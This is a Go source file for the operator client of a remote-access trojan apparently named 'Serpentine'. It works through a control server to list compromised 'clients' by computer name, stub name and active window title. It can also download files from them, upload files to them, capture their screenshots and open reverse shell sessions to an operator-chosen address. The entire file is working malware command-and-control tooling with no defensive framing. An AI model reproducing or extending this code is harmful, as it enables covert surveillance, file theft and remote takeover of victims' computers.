package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"flag"
	"github.com/olekukonko/tablewriter"
	"io"
	"io/ioutil"
	"net/http"
	"os"
)

var serverAddress string
var serverPort string

func main() {
	initLogger()

	serverAddressLocal := flag.String("serverAddress", "127.0.0.1", "Address of Serpentine server")
	serverPortLocal := flag.String("serverPort", "8080", "Port of Serpentine server")
	showClients := flag.Bool("showClients", false, "Show clients")
	getFile := flag.Bool("getFile", false, "Get a file from a client")
	putFile := flag.Bool("putFile", false, "Upload a file to a client")
	createShellSession := flag.Bool("createShellSession", false, "Creates a reverse shell session")
	getScreenshot := flag.Bool("getScreenshot", false, "Gets a screenshot")
	shellAddress := flag.String("shellAddress", "", "Address reverse shell will connect to")
	shellPort := flag.String("shellPort", "", "Port reverse shell will connect to")
	clientName := flag.String("clientName", "", "Name of client to operate on")
	changeClientName := flag.Bool("changeClientName", false, "Change name of the client")
	newClientName := flag.String("newClientName", "", "New name to set on client, required for 'changeClientName' command")
	remoteFilePath := flag.String("remoteFilePath", "", "Path to a file on client")
	localFilePath := flag.String("localFilePath", "", "Path to a local file")

	flag.Parse()

	serverAddress = *serverAddressLocal
	serverPort = *serverPortLocal

	if *showClients {
		doShowClients()
	} else if *changeClientName {
		if *clientName == "" || *newClientName == "" {
			log.Error("'clientName' and 'newClientName' parameters are required for 'changeClientName' command")
		} else {
			doChangeClientName(*clientName, *newClientName)
		}
	} else if *getFile {
		if *clientName == "" || *remoteFilePath == "" {
			log.Error("'clientName' and 'remoteFilePath' parameters are required for 'getFile' command")
		} else {
			doGetFile(*clientName, *remoteFilePath)
		}
	} else if *putFile {
		if *clientName == "" || *localFilePath == "" || *remoteFilePath == "" {
			log.Error("'clientName', 'localFilePath', and 'remoteFilePath' parameters are required for 'putFile' command")
		}
		doPutFile(*clientName, *localFilePath, *remoteFilePath)
	} else if *createShellSession {
		if *clientName == "" || *shellAddress == "" || *shellPort == "" {
			log.Error("'clientName', 'shellAddress', and 'shellPort' parameters are required for 'createShellSession' command")
		} else {
			doCreateShellSession(*clientName, *shellAddress, *shellPort)
		}
	} else if *getScreenshot {
		if *clientName == "" {
			log.Error("'clientName' parameter is required for 'getScreenshot' command")
		} else {
			doGetScreenshot(*clientName)
		}
	} else {
		flag.PrintDefaults()
	}
}

func doCreateShellSession(clientName string, shellAddress string, shellPort string) {
	req, err := json.Marshal(map[string]string{
		"address": shellAddress,
		"port":    shellPort,
	})
	if err != nil {
		log.Error(err)
		return
	}
	resp, err := http.Post("http://"+serverAddress+":"+serverPort+"/shell/"+clientName, "application/json", bytes.NewBuffer(req))
	if err != nil {
		log.Error(err)
		return
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Error(err)
		return
	}
	log.Info(string(body))
}

func doPutFile(clientName string, localFilePath string, remoteFilePath string) {
	file, err := ioutil.ReadFile(localFilePath)
	if err != nil {
		log.Error(err)
		return
	}
	fileBase64 := base64.StdEncoding.EncodeToString([]byte(file))
	reqBody, err := json.Marshal(map[string]string{
		"filename": remoteFilePath,
		"file":     fileBase64,
	})
	if err != nil {
		log.Error(err)
		return
	}
	client := &http.Client{}
	req, err := http.NewRequest(http.MethodPut, "http://"+serverAddress+":"+serverPort+"/file/"+clientName, bytes.NewBuffer(reqBody))
	if err != nil {
		log.Error(err)
		return
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		log.Error(err)
		return
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Error(err)
		return
	}
	log.Info(string(body))
}

type GetFileResponse struct {
	File string
}

func doGetFile(clientName string, filePath string) {
	req, err := json.Marshal(map[string]string{
		"filename": filePath,
	})
	if err != nil {
		log.Error(err)
		return
	}
	resp, err := http.Post("http://"+serverAddress+":"+serverPort+"/file/"+clientName, "application/json", bytes.NewBuffer(req))
	if err != nil {
		log.Error(err)
		return
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Error(err)
		return
	}
	var response GetFileResponse
	json.Unmarshal(body, &response)
	decoded, err := base64.StdEncoding.DecodeString(response.File)
	if err != nil {
		log.Error(err)
		return
	}
	os.MkdirAll("./files/"+clientName, os.ModePerm)
	err = ioutil.WriteFile("./files/"+clientName+"/"+filePath, decoded, 0644)
	if err != nil {
		log.Error(err)
		return
	}
}

func doChangeClientName(oldName string, newName string) {
	req, err := json.Marshal(map[string]string{
		"client":  oldName,
		"newName": newName,
	})
	if err != nil {
		log.Error(err)
		return
	}
	resp, err := http.Post("http://"+serverAddress+":"+serverPort+"/client", "application/json", bytes.NewBuffer(req))
	if err != nil {
		log.Error(err)
		return
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Error(err)
		return
	}
	log.Info(string(body))
}

type Client struct {
	Name              string
	Address           string
	ComputerName      string
	StubName          string
	ActiveWindowTitle string
}

func doShowClients() {
	resp, err := http.Get("http://" + serverAddress + ":" + serverPort + "/client")
	if err != nil {
		log.Error(err)
		return
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Error(err)
		return
	}
	var clients []Client
	json.Unmarshal(body, &clients)
	table := tablewriter.NewWriter(os.Stdout)
	table.SetHeader([]string{"Name", "Address", "Computer Name", "Stub Name", "Active Window Title"})
	for _, c := range clients {
		table.Append([]string{c.Name, c.Address, c.ComputerName, c.StubName, c.ActiveWindowTitle})
	}
	table.Render()
}

func doGetScreenshot(clientName string) {
	resp, err := http.Get("http://" + serverAddress + ":" + serverPort + "/desktop/" + clientName)
	if err != nil {
		log.Error(err)
		return
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Error(err)
		return
	}
	var response GetFileResponse
	json.Unmarshal(body, &response)
	decoded, err := base64.StdEncoding.DecodeString(response.File)
	if err != nil {
		log.Error(err)
		return
	}
	os.MkdirAll("./files/"+clientName+"/screenshots", os.ModePerm)
	err = ioutil.WriteFile("./files/"+clientName+"/screenshots/last.jpg", decoded, 0644)
	if err != nil {
		log.Error(err)
		return
	}
}
